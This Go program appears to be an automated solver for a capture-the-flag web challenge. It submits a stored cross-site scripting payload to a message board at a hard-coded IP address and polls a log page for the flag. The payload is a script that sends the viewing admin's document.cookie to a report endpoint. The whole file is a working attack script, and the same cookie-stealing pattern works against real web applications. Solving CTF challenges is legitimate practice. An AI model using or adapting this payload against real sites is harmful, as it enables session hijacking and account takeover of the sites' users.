package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const defaultBaseURL = "http://47.120.61.230:33236"

func main() {
	baseURL := defaultBaseURL
	if len(os.Args) > 1 {
		baseURL = strings.TrimRight(os.Args[1], "/")
	}

	// Stored XSS payload: when admin bot reviews /board, it sends document.cookie to /report.
	payload := "<script>fetch(`/report?c=${encodeURIComponent(document.cookie)}`)</script>"
	author := fmt.Sprintf("go-solver-%d", time.Now().Unix())

	client := &http.Client{
		Timeout: 10 * time.Second,
		// The target returns 302 after POST /board. Do not follow it as POST.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	fmt.Printf("[*] Target: %s\n", baseURL)
	fmt.Println("[*] Submitting stored XSS payload to /board ...")
	if err := submitPayload(client, baseURL, author, payload); err != nil {
		fmt.Fprintf(os.Stderr, "[-] submit failed: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[+] Payload submitted.")

	fmt.Println("[*] Waiting for admin bot and polling /xss-log ...")
	flag, err := pollFlag(client, baseURL, 90*time.Second, 5*time.Second)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] flag not found: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] FLAG: %s\n", flag)
}

func submitPayload(client *http.Client, baseURL, author, payload string) error {
	form := url.Values{}
	form.Set("author", author)
	form.Set("content", payload)

	req, err := http.NewRequest("POST", baseURL+"/board", strings.NewReader(form.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "TOGOGO-XSS-Go-Solver/1.0")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode != http.StatusFound && resp.StatusCode != http.StatusSeeOther && resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status from /board: %s", resp.Status)
	}
	return nil
}

func pollFlag(client *http.Client, baseURL string, timeout, interval time.Duration) (string, error) {
	deadline := time.Now().Add(timeout)
	re := regexp.MustCompile(`TOGOGO-flag\{[^}]+\}`)

	for time.Now().Before(deadline) {
		body, err := get(client, baseURL+"/xss-log")
		if err != nil {
			fmt.Printf("[!] read /xss-log failed: %v\n", err)
		} else if flag := re.FindString(body); flag != "" {
			return flag, nil
		}

		fmt.Printf("[*] Not found yet, sleep %s ...\n", interval)
		time.Sleep(interval)
	}

	return "", fmt.Errorf("timeout after %s", timeout)
}

func get(client *http.Client, target string) (string, error) {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "TOGOGO-XSS-Go-Solver/1.0")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return string(b), fmt.Errorf("unexpected status: %s", resp.Status)
	}
	return string(b), nil
}
